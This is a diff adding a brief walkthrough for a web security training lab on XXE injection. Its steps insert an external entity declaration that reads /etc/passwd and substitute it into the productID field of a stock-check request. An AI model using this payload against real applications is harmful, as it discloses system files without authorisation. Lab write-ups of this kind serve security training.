@@ -1,0 +1,7 @@
+#1 Lab:Exploiting XXE using external entities to retrieve files
+
+    1. Check stock and send the request to repeater.
+    2. Add <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> aftr xml line
+    3. Replace the value of productID with &xxe; and send the request.
+
+---------------------------------------------------------------------------------------------------
